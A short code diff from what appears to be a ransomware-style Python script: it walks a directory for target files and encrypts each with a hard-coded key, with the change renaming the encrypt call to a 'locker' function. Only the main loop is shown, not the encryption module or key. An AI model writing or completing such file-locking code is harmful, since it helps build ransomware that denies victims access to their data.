@@ -1,4 +1,4 @@
-from Locker import encrypt, decrypt
+from Locker import locker
 from walker import walker
 
 def main():
@@ -21,7 +21,7 @@ def main():
     
   targets = walker(path)
     for target in targets:
-        encrypt(target, HARDCODED_KEY)
+        locker(target, HARDCODED_KEY)
   
 if __name__ == '__main__':
   main()
